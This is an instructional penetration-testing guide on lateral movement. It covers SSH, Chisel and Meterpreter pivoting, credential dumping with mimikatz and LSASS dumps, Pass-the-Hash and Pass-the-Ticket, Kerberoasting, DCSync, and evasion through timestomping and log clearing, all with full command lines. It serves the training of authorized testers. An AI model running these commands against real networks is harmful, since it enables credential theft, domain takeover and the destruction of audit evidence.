# Lateral Movement Phase

> **Phase 6 of 8** in the Penetration Testing Process

---

## What You'll Learn

By the end of this section, you'll understand:

- The difference between pivoting and lateral movement
- How to set up tunnels to reach internal networks
- Windows lateral movement techniques (PsExec, WMI, WinRM, DCOM, RDP)
- Pass-the-Hash, Pass-the-Ticket, and Overpass-the-Hash attacks
- Linux lateral movement via SSH
- Active Directory attacks for credential access
- How to document your attack path

---

## Key Terms

| Term | Definition |
|------|------------|
| **Pivoting** | Using a compromised host to access networks you couldn't reach directly |
| **Lateral Movement** | Moving from one compromised host to another within a network |
| **Pass-the-Hash (PtH)** | Authenticating using an NTLM hash instead of a password |
| **Pass-the-Ticket (PtT)** | Authenticating using a stolen Kerberos ticket |
| **SOCKS Proxy** | A proxy protocol that routes TCP connections through a tunnel |
| **TGT** | Ticket Granting Ticket - Kerberos credential for requesting service tickets |
| **DCSync** | Attack that replicates AD credentials by impersonating a domain controller |
| **Kerberoasting** | Requesting service tickets and cracking them offline |

---

## Prerequisites

Before diving into lateral movement, you should have:

- Completed the **Post-Exploitation** phase on at least one host
- Harvested credentials (passwords, hashes, tokens, or tickets)
- Performed situational awareness to understand network topology
- Identified potential targets for lateral movement

---

## What Is Lateral Movement?

You've compromised one system. But the real prize—the domain controller, the database server, the CEO's workstation—is somewhere else on the network. Lateral movement is how you get there.

Think of it like this: You broke into an office building through a ground-floor window (exploitation). Now you need to move through the building—using hallways, elevators, and access cards—to reach the executive suite on the top floor. That journey through the building is lateral movement.

**Key distinction:**
- **Pivoting** = Using a compromised host to *reach* other networks (setting up your transportation)
- **Lateral Movement** = Actually *moving* to and compromising other hosts (the journey itself)

You pivot to get network access. You move laterally to compromise additional systems.

---

## Why Lateral Movement Matters

Real attackers don't stop at the first system they compromise. They move laterally to:
- Reach higher-value targets
- Find domain admin credentials
- Access sensitive databases
- Compromise backup systems
- Establish redundant access
- Demonstrate full network compromise

**Without lateral movement, your report says:** "We compromised a web server."

**With lateral movement, your report says:** "We compromised a web server, pivoted to the internal network, harvested domain credentials, moved to the domain controller, and achieved full domain compromise."

The second finding demonstrates the real risk and gets prioritized for remediation.

---

## Key Concepts

### Pivoting vs. Lateral Movement

These terms are often confused. Here's the difference:

| Concept | What It Is | Analogy |
|---------|------------|---------|
| **Pivoting** | Using one machine to access another network | Building a bridge to reach an island |
| **Lateral Movement** | Moving from one host to another | Walking across that bridge |

**Pivoting** sets up the path. **Lateral movement** is taking that path.

### Types of Lateral Movement

| Type | Method | Example |
|------|--------|---------|
| **Credential-based** | Use stolen credentials | Pass-the-Hash, SSH with keys |
| **Exploitation-based** | Exploit vulnerabilities | EternalBlue, CVE-based attacks |
| **Trust-based** | Abuse trust relationships | Domain trusts, SSH key reuse |
| **Token/Ticket-based** | Steal authentication tokens | Pass-the-Ticket, Token Impersonation |

### The Lateral Movement Cycle

Lateral movement is iterative. Each new system you compromise restarts the post-exploitation cycle:

```
┌─────────────────────────────────────────────────────────────────┐
│                   LATERAL MOVEMENT CYCLE                         │
└─────────────────────────────────────────────────────────────────┘

    ┌──────────────┐
    │ Compromised  │
    │    Host A    │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Harvest    │  ← Get creds, tokens, tickets
    │ Credentials  │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Identify   │  ← Find where creds are valid
    │   Targets    │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │    Move      │  ← PSExec, WMI, WinRM, SSH
    │  Laterally   │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │ Compromised  │  ← Now repeat from here
    │    Host B    │
    └──────────────┘
           │
           └──────▶ (Repeat cycle)
```

---

## The Lateral Movement Process

Here's the systematic approach:

```
┌─────────────────────────────────────────────────────────────────┐
│                  LATERAL MOVEMENT WORKFLOW                       │
└─────────────────────────────────────────────────────────────────┘

    ┌──────────────┐
    │  Set Up      │  ← Create tunnels to reach internal networks
    │  Pivoting    │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Internal   │  ← Map the internal network
    │    Recon     │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Identify   │  ← Find high-value targets
    │   Targets    │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Harvest    │  ← Collect creds from current host
    │    Creds     │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │  Test Cred   │  ← See where creds work
    │   Validity   │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │    Move      │  ← Execute lateral movement technique
    │  to Target   │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Repeat     │  ← Post-exploitation on new host
    │    Cycle     │
    └──────────────┘
```

---

## Step 1: Set Up Pivoting

Before you can move laterally, you need to reach the internal network. Pivoting creates that path.

### Understanding Network Position

```
                    INTERNET
                        │
                        ▼
              ┌─────────────────┐
              │   Firewall/     │
              │   DMZ           │
              └────────┬────────┘
                       │
         ┌─────────────┴─────────────┐
         │                           │
         ▼                           ▼
┌─────────────────┐         ┌─────────────────┐
│   Web Server    │         │   Mail Server   │
│  (Compromised)  │         │                 │
│  192.168.1.10   │         │  192.168.1.20   │
└────────┬────────┘         └─────────────────┘
         │
         │ ◄─── You are here, need to reach:
         │
         ▼
┌─────────────────────────────────────────────┐
│           INTERNAL NETWORK                   │
│   10.10.10.0/24                             │
│                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │    DC    │  │ Database │  │ Backup   │  │
│  │10.10.10.1│  │10.10.10.5│  │10.10.10.9│  │
│  └──────────┘  └──────────┘  └──────────┘  │
└─────────────────────────────────────────────┘
```

Your attacker machine can't directly reach 10.10.10.0/24, but the compromised web server can. You need to pivot through it.

### SSH Tunneling

SSH is the most reliable pivoting method when available.

#### Local Port Forwarding

Forward a local port to a remote destination through the pivot host.

```bash
# Syntax: ssh -L LOCAL_PORT:DESTINATION:DEST_PORT user@PIVOT

# Example: Access internal RDP (10.10.10.5:3389) through pivot
ssh -L 13389:10.10.10.5:3389 user@192.168.1.10

# Now connect to localhost:13389 to reach 10.10.10.5:3389
xfreerdp /v:localhost:13389 /u:admin /p:password

# Multiple forwards
ssh -L 13389:10.10.10.5:3389 -L 1445:10.10.10.1:445 user@192.168.1.10
```

**How it works:**

```
┌──────────────┐     SSH Tunnel      ┌──────────────┐              ┌──────────────┐
│   Attacker   │◄───────────────────▶│    Pivot     │─────────────▶│   Target     │
│              │                     │ 192.168.1.10 │              │ 10.10.10.5   │
│ localhost:   │                     │              │              │              │
│   13389      │                     │              │              │    :3389     │
└──────────────┘                     └──────────────┘              └──────────────┘
     Your machine                      Compromised                    Internal
  sends to :13389                      host forwards                  RDP server
                                       to target
```

#### Remote Port Forwarding

Make a port on the pivot accessible from your machine (useful for reverse shells).

```bash
# Syntax: ssh -R REMOTE_PORT:LOCAL_DEST:LOCAL_PORT user@PIVOT

# Example: Make your port 4444 accessible as pivot:4444
ssh -R 4444:localhost:4444 user@192.168.1.10

# Now internal hosts can connect to 192.168.1.10:4444
# and reach your listener on localhost:4444
```

#### Dynamic Port Forwarding (SOCKS Proxy)

Create a SOCKS proxy to access ANY host through the pivot.

```bash
# Create SOCKS proxy on localhost:9050
ssh -D 9050 user@192.168.1.10

# Now use proxychains to route any tool through the proxy
# Edit /etc/proxychains.conf:
# socks4 127.0.0.1 9050

# Route tools through proxy
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://10.10.10.5
proxychains ssh admin@10.10.10.1
```

### Chisel

Chisel is a fast TCP/UDP tunnel, perfect when SSH isn't available.

```bash
# On attacker machine (server mode)
./chisel server -p 8000 --reverse

# On compromised host (client mode)
./chisel client YOUR_IP:8000 R:socks

# This creates a SOCKS proxy on YOUR machine at 127.0.0.1:1080
# Use proxychains to route traffic through it
proxychains nmap -sT 10.10.10.0/24
```

**Chisel options:**

```bash
# Reverse SOCKS proxy (most common)
./chisel client YOUR_IP:8000 R:socks

# Forward specific port
./chisel client YOUR_IP:8000 R:3389:10.10.10.5:3389

# Multiple forwards
./chisel client YOUR_IP:8000 R:3389:10.10.10.5:3389 R:445:10.10.10.1:445
```

### Ligolo-ng

Modern tunneling tool that creates a virtual interface.

```bash
# On attacker (proxy mode)
./proxy -selfcert

# On compromised host (agent mode)
./agent -connect YOUR_IP:11601 -ignore-cert

# In proxy console:
ligolo-ng » session
ligolo-ng » start

# Add route to internal network
sudo ip route add 10.10.10.0/24 dev ligolo

# Now you can access internal network directly (no proxychains needed!)
nmap 10.10.10.0/24
ssh admin@10.10.10.1
```

### Meterpreter Pivoting

If you have a Meterpreter session:

```bash
# Add route through session
meterpreter > run autoroute -s 10.10.10.0/24

# Or from msfconsole
msf > use post/multi/manage/autoroute
msf > set SESSION 1
msf > set SUBNET 10.10.10.0
msf > run

# Create SOCKS proxy
msf > use auxiliary/server/socks_proxy
msf > set SRVHOST 127.0.0.1
msf > set SRVPORT 9050
msf > run

# Now use proxychains
proxychains nmap -sT 10.10.10.0/24
```

### Port Forwarding with Meterpreter

```bash
# Local port forward
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5

# Now connect to localhost:3389 to reach 10.10.10.5:3389
xfreerdp /v:localhost:3389

# List forwards
meterpreter > portfwd list

# Remove forward
meterpreter > portfwd delete -l 3389
```

### Proxychains Configuration

```bash
# Edit /etc/proxychains4.conf
# At the bottom, add your proxy:

# For SSH dynamic forward
socks4 127.0.0.1 9050

# For Chisel
socks5 127.0.0.1 1080

# For Metasploit
socks4 127.0.0.1 9050

# Usage
proxychains nmap -sT -Pn 10.10.10.1
proxychains ssh user@10.10.10.1
proxychains crackmapexec smb 10.10.10.0/24
```

---

## Step 2: Internal Reconnaissance

Once you can reach the internal network, map it out.

### Network Discovery

```bash
# Through proxychains
proxychains nmap -sn 10.10.10.0/24

# Faster: use native tools on pivot
# On Linux pivot:
for i in {1..254}; do ping -c 1 -W 1 10.10.10.$i &>/dev/null && echo "10.10.10.$i up"; done

# On Windows pivot:
1..254 | ForEach-Object { Test-Connection -ComputerName "10.10.10.$_" -Count 1 -Quiet -ErrorAction SilentlyContinue } | ForEach-Object { if($_) { "10.10.10.$_ up" } }
```

### Service Discovery

```bash
# Scan for common services
proxychains nmap -sT -Pn -p 22,80,135,139,443,445,1433,3306,3389,5985 10.10.10.0/24

# Focus on high-value ports:
# 445 - SMB (lateral movement)
# 135 - RPC (WMI)
# 5985 - WinRM
# 3389 - RDP
# 22 - SSH
# 1433 - MSSQL
# 3306 - MySQL
```

### Active Directory Enumeration

If domain-joined:

```bash
# On compromised Windows host
# Find domain controllers
nltest /dclist:domain.local
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# Enumerate domain
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# BloodHound collection
.\SharpHound.exe -c all
```

### Identify High-Value Targets

| Target Type | Why It Matters | How to Find |
|-------------|----------------|-------------|
| Domain Controllers | Full domain compromise | DNS SRV records, port 389/636 |
| Database Servers | Sensitive data | Port 1433/3306/5432/1521 |
| File Servers | Documents, credentials | Port 445, shares |
| Backup Servers | Credentials, data | Hostname patterns |
| Admin Workstations | Cached credentials | AD group membership |
| Jump Hosts | Access to more networks | Network documentation |

---

## Step 3: Credential Harvesting (Review)

Before moving laterally, ensure you have credentials to use. Common sources:

```bash
# Memory (Windows)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# SAM database
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
secretsdump.py -sam SAM -system SYSTEM LOCAL

# LSASS dump
procdump.exe -ma lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp

# Linux
cat /etc/shadow
cat ~/.ssh/id_rsa
grep -r password /var/www/
```

---

## Step 4: Test Credential Validity

Before using credentials, test where they're valid.

### CrackMapExec (CME)

The Swiss Army knife for testing credentials.

```bash
# Test single credential against multiple hosts
crackmapexec smb 10.10.10.0/24 -u administrator -p 'Password123'

# Test with hash
crackmapexec smb 10.10.10.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99'

# Test multiple credentials
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt

# Check for local admin
crackmapexec smb 10.10.10.0/24 -u administrator -p 'Password123' --local-auth

# WinRM
crackmapexec winrm 10.10.10.0/24 -u administrator -p 'Password123'

# SSH
crackmapexec ssh 10.10.10.0/24 -u root -p 'Password123'
```

**Understanding CME output:**

```
SMB  10.10.10.5  445  DC01  [*] Windows Server 2019 Build 17763 x64
SMB  10.10.10.5  445  DC01  [+] domain.local\administrator:Password123 (Pwn3d!)
```

- `[+]` = Credentials valid
- `(Pwn3d!)` = User has local admin rights

### Testing Specific Services

```bash
# SMB
smbclient -L //10.10.10.5 -U 'domain\user%password'

# WinRM
evil-winrm -i 10.10.10.5 -u administrator -p 'Password123'

# RDP
xfreerdp /v:10.10.10.5 /u:administrator /p:'Password123' /cert-ignore

# SSH
ssh user@10.10.10.5

# MSSQL
mssqlclient.py domain/user:password@10.10.10.5
```

---

## Step 5: Windows Lateral Movement Techniques

Now for the actual movement. Windows offers many options.

### PsExec

Executes commands on remote systems via SMB.

```bash
# Using Impacket (from Linux)
psexec.py domain/administrator:Password123@10.10.10.5

# With hash
psexec.py -hashes :NTLM_HASH domain/administrator@10.10.10.5

# Using Sysinternals PsExec (from Windows)
.\PsExec.exe \\10.10.10.5 -u domain\administrator -p Password123 cmd.exe
```

**How PsExec works:**
1. Uploads a service binary to ADMIN$ share
2. Creates and starts a Windows service
3. Service executes your command
4. Service is removed after execution

**Artifacts:** Creates service, writes to disk, logged in Event Logs.

### WMI (Windows Management Instrumentation)

Execute commands via WMI - more stealthy than PsExec.

```bash
# Using Impacket
wmiexec.py domain/administrator:Password123@10.10.10.5

# With hash
wmiexec.py -hashes :NTLM_HASH domain/administrator@10.10.10.5

# Using PowerShell (from Windows)
Invoke-WmiMethod -ComputerName 10.10.10.5 -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt"

# Using wmic (from Windows)
wmic /node:10.10.10.5 /user:domain\administrator /password:Password123 process call create "cmd.exe /c whoami"
```

**How WMI works:**
1. Connects to WMI service (port 135, then dynamic port)
2. Creates process remotely
3. No file written to disk (semi-fileless)

**Artifacts:** Less than PsExec, but still logged.

### WinRM (Windows Remote Management)

PowerShell remoting - very powerful when enabled.

```bash
# Using Evil-WinRM (from Linux)
evil-winrm -i 10.10.10.5 -u administrator -p 'Password123'

# With hash
evil-winrm -i 10.10.10.5 -u administrator -H 'NTLM_HASH'

# Using PowerShell (from Windows)
$cred = Get-Credential
Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred

# Or invoke command
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -ScriptBlock { whoami }
```

**How WinRM works:**
1. Connects to WinRM service (port 5985/5986)
2. Establishes PowerShell session
3. Full interactive shell

**Artifacts:** PowerShell logging, WinRM logs.

### SMBExec

Similar to PsExec but uses a different technique.

```bash
# Using Impacket
smbexec.py domain/administrator:Password123@10.10.10.5

# With hash
smbexec.py -hashes :NTLM_HASH domain/administrator@10.10.10.5
```

**How it works:** Creates a Windows service that executes commands and writes output to a file, which is then retrieved.

### DCOM (Distributed Component Object Model)

Less common, but useful for lateral movement.

```bash
# Using Impacket
dcomexec.py domain/administrator:Password123@10.10.10.5

# Using PowerShell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\output.txt","7")
```

### RDP (Remote Desktop Protocol)

Interactive GUI access.

```bash
# From Linux
xfreerdp /v:10.10.10.5 /u:administrator /p:'Password123' /cert-ignore

# Or rdesktop
rdesktop -u administrator -p 'Password123' 10.10.10.5

# Enable RDP remotely (if you have admin)
crackmapexec smb 10.10.10.5 -u administrator -p 'Password123' -M rdp -o ACTION=enable
```

### Lateral Movement Tool Comparison

| Tool | Port | Requires | Stealth | Use Case |
|------|------|----------|---------|----------|
| **PsExec** | 445 | Admin + SMB | Low | Quick shell access |
| **WMI** | 135 + Dynamic | Admin | Medium | Semi-fileless execution |
| **WinRM** | 5985/5986 | Admin + WinRM | Medium | Interactive PowerShell |
| **DCOM** | 135 + Dynamic | Admin | Medium | Alternative to WMI |
| **RDP** | 3389 | RDP access | Low | Interactive GUI |
| **SSH** | 22 | SSH access | Medium | Linux systems |

---

## Step 6: Pass-the-Hash (PtH)

Pass-the-Hash lets you authenticate using an NTLM hash instead of a password.

### How It Works

```
Normal Authentication:
User → Password → NTLM Hash → Sent to Server → Verified

Pass-the-Hash:
Attacker → Stolen NTLM Hash → Sent to Server → Verified
```

Windows NTLM authentication only needs the hash, not the password. If you steal a hash, you can authenticate as that user.

### Extracting Hashes

```bash
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Output includes:
# NTLM: aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
#       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#             LM Hash (often empty)              NTLM Hash
```

### Using the Hash

```bash
# PsExec
psexec.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 domain/administrator@10.10.10.5

# WMI
wmiexec.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 domain/administrator@10.10.10.5

# Evil-WinRM
evil-winrm -i 10.10.10.5 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99'

# CrackMapExec
crackmapexec smb 10.10.10.0/24 -u administrator -H '5f4dcc3b5aa765d61d8327deb882cf99'

# Mimikatz (for RDP, etc.)
mimikatz.exe "sekurlsa::pth /user:administrator /domain:domain.local /ntlm:5f4dcc3b5aa765d61d8327deb882cf99"
```

### Hash Format

```
LM:NTLM
aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
^Empty LM hash (common)^           ^The actual NTLM hash^

# When using Impacket tools, use format:
-hashes LM:NTLM
-hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99

# Or just the NTLM part:
-hashes :5f4dcc3b5aa765d61d8327deb882cf99
```

---

## Step 7: Pass-the-Ticket (PtT)

Pass-the-Ticket uses stolen Kerberos tickets for authentication.

### How Kerberos Works (Simplified)

```
1. User authenticates to Domain Controller
2. DC gives user a Ticket Granting Ticket (TGT)
3. User presents TGT to request Service Tickets
4. User presents Service Ticket to access services
```

If you steal someone's TGT or Service Ticket, you can impersonate them.

### Extracting Tickets

```bash
# Mimikatz - export all tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# This creates .kirbi files for each ticket
# Look for TGT tickets (krbtgt)

# Rubeus - dump tickets
.\Rubeus.exe dump

# Rubeus - dump specific user
.\Rubeus.exe dump /user:administrator
```

### Using Tickets

```bash
# Mimikatz - Pass the Ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" exit

# Now your session uses that ticket
# Access resources as the ticket owner
dir \\dc01\c$

# Rubeus
.\Rubeus.exe ptt /ticket:base64_ticket

# On Linux with Impacket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

### Converting Tickets

```bash
# Convert .kirbi (Windows) to .ccache (Linux)
ticketConverter.py ticket.kirbi ticket.ccache

# Convert .ccache to .kirbi
ticketConverter.py ticket.ccache ticket.kirbi
```

---

## Step 8: Overpass-the-Hash (Pass-the-Key)

Use an NTLM hash to request a Kerberos ticket, then use the ticket.

```bash
# Rubeus
.\Rubeus.exe asktgt /user:administrator /ntlm:5f4dcc3b5aa765d61d8327deb882cf99 /ptt

# This requests a TGT using the hash and injects it into your session

# Mimikatz
mimikatz.exe "sekurlsa::pth /user:administrator /domain:domain.local /ntlm:5f4dcc3b5aa765d61d8327deb882cf99 /run:powershell.exe"

# This starts PowerShell with a Kerberos ticket for the specified user
```

**Why use Overpass-the-Hash?**
- Some systems don't accept NTLM (Kerberos only)
- Kerberos authentication is sometimes less monitored
- Needed for certain attacks (constrained delegation)

---

## Step 9: Linux Lateral Movement

### SSH

The most common method for Linux lateral movement.

```bash
# With password
ssh user@10.10.10.5

# With key
ssh -i id_rsa user@10.10.10.5

# Through proxy
proxychains ssh user@10.10.10.5
```

### SSH Key Reuse

If you find SSH keys on a compromised host:

```bash
# Check for keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa

# Check known_hosts for targets
cat ~/.ssh/known_hosts

# Use found key
chmod 600 stolen_key
ssh -i stolen_key user@other_host
```

### Credential Reuse

Users often reuse passwords:

```bash
# Try found password on other hosts
crackmapexec ssh 10.10.10.0/24 -u user -p 'found_password'

# Check for password in bash history
cat ~/.bash_history | grep -i pass
```

---

## Step 10: Active Directory Lateral Movement

AD environments offer additional movement options.

### Kerberoasting

Request service tickets and crack them offline.

```bash
# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request

# Using Rubeus
.\Rubeus.exe kerberoast

# Crack the ticket
hashcat -m 13100 ticket.txt rockyou.txt
```

### AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication."

```bash
# Using Impacket
GetNPUsers.py domain.local/ -dc-ip 10.10.10.1 -usersfile users.txt -format hashcat

# Using Rubeus
.\Rubeus.exe asreproast

# Crack
hashcat -m 18200 hashes.txt rockyou.txt
```

### Constrained Delegation Abuse

If you compromise an account with constrained delegation:

```bash
# Find accounts with delegation
# In BloodHound: "Find Computers with Constrained Delegation"

# Using Rubeus
.\Rubeus.exe s4u /user:service_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

### DCSync

If you have replication rights (Domain Admin, etc.):

```bash
# Using Mimikatz
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"

# Using Impacket
secretsdump.py domain.local/administrator:Password123@10.10.10.1

# This dumps all domain hashes!
```

---

## Evasion Considerations

> **Important:** Evasion techniques are documented for educational purposes and authorized testing only. Some techniques (like clearing logs) may be prohibited by your Rules of Engagement. Always get explicit written permission before using evasion tactics.

Lateral movement can trigger alerts. Consider:

### Detection Points

| Technique | Detection | Evasion |
|-----------|-----------|---------|
| PsExec | Service creation, file write | Use WMI or WinRM instead |
| Pass-the-Hash | Event 4624 Type 9 | Use Kerberos (Overpass-the-Hash) |
| WMI | Process creation events | Blend with legitimate WMI |
| WinRM | PowerShell logging | Use constrained language mode |
| Large scans | Network traffic analysis | Slow scanning, blend with traffic |

### Evasion Tips

```bash
# Slow your scans
proxychains nmap -sT -Pn --max-rate 10 10.10.10.0/24

# Use legitimate admin tools
# Instead of Mimikatz, use: comsvcs.dll MiniDump

# Timestomp files
timestomp.exe payload.exe -m "01/01/2020 12:00:00"

# Clear your tracks (ONLY if authorized in RoE!)
# Windows: wevtutil cl Security
# Linux: echo > /var/log/auth.log
# WARNING: Log clearing is often prohibited and destroys evidence
```

---

## Documentation During Lateral Movement

Track your path through the network.

### Movement Log Template

```markdown
## Lateral Movement Path

### Starting Point
- **Host:** WEB01 (192.168.1.10)
- **Access:** www-data → root via sudo abuse
- **Credentials Found:** admin:Password123, NTLM hash

### Movement 1: WEB01 → DC01
- **Time:** YYYY-MM-DD HH:MM UTC
- **Target:** DC01 (10.10.10.1)
- **Technique:** Pass-the-Hash via WMI
- **Credential Used:** administrator NTLM hash
- **Command:** `wmiexec.py -hashes :5f4dcc... domain/administrator@10.10.10.1`
- **Result:** SYSTEM shell on DC01

### Movement 2: DC01 → DB01
- **Time:** YYYY-MM-DD HH:MM UTC
- **Target:** DB01 (10.10.10.5)
- **Technique:** DCSync + PSExec
- **Credential Used:** Domain Admin hash
- **Command:** `psexec.py -hashes :abc123... domain/sqladmin@10.10.10.5`
- **Result:** Admin shell on DB01

### Network Diagram
WEB01 → DC01 → DB01
        ↓
      BACKUP01
```

---

## Common Mistakes to Avoid

| Mistake | Consequence | Prevention |
|---------|-------------|------------|
| No pivoting setup | Can't reach internal targets | Set up tunnels first |
| Testing creds one by one | Slow, triggers lockouts | Use CME to test efficiently |
| Using PsExec when WMI works | More artifacts, easier detection | Choose technique by stealth needs |
| Not documenting the path | Can't reproduce, missing from report | Log every movement |
| Moving too fast | Triggers alerts, accounts locked | Be methodical |
| Ignoring Linux hosts | Miss easy targets | Check for SSH key reuse |
| Not collecting creds at each hop | Limited further movement | Harvest creds on every host |
| Using same technique everywhere | Pattern detection | Vary your techniques |

---

## Quick Reference: Lateral Movement Cheatsheet

### Pivoting

| Method | Command |
|--------|---------|
| SSH Dynamic Proxy | `ssh -D 9050 user@pivot` |
| SSH Local Forward | `ssh -L LOCAL:TARGET:PORT user@pivot` |
| Chisel | Server: `chisel server -p 8000 --reverse` / Client: `chisel client IP:8000 R:socks` |
| Meterpreter Route | `run autoroute -s SUBNET` |

### Credential Testing

| Tool | Command |
|------|---------|
| CME SMB | `crackmapexec smb TARGETS -u USER -p PASS` |
| CME Hash | `crackmapexec smb TARGETS -u USER -H HASH` |
| CME WinRM | `crackmapexec winrm TARGETS -u USER -p PASS` |

### Windows Lateral Movement

| Technique | Command |
|-----------|---------|
| PsExec | `psexec.py DOMAIN/USER:PASS@TARGET` |
| WMI | `wmiexec.py DOMAIN/USER:PASS@TARGET` |
| WinRM | `evil-winrm -i TARGET -u USER -p PASS` |
| PtH | `psexec.py -hashes :HASH DOMAIN/USER@TARGET` |

### Linux Lateral Movement

| Technique | Command |
|-----------|---------|
| SSH Password | `ssh user@target` |
| SSH Key | `ssh -i key user@target` |

### AD Attacks

| Attack | Command |
|--------|---------|
| Kerberoast | `GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC -request` |
| AS-REP Roast | `GetNPUsers.py DOMAIN/ -dc-ip DC -usersfile users.txt` |
| DCSync | `secretsdump.py DOMAIN/ADMIN:PASS@DC` |

---

## Summary

Lateral movement is how you turn a single compromise into a network-wide demonstration of risk. Remember:

1. **Pivot first** - Set up tunnels to reach internal networks
2. **Map the network** - Know where you're going before you move
3. **Harvest credentials** - Every host is a potential source of new creds
4. **Test before you move** - Verify credentials work before committing
5. **Choose your technique** - Match the tool to your stealth requirements
6. **Document the path** - Your report needs to show the attack chain
7. **Think like an attacker** - Real attackers don't stop at one system

The goal of lateral movement isn't just to collect more shells—it's to demonstrate how an attacker could reach your client's most critical assets starting from a single point of compromise.

---

## Next Steps

Once you've moved through the network and achieved your objectives, proceed to:

**[Phase 7: Proof of Concept](7_proof_of_concept.md)** - Document and demonstrate the impact of your findings with clear evidence.
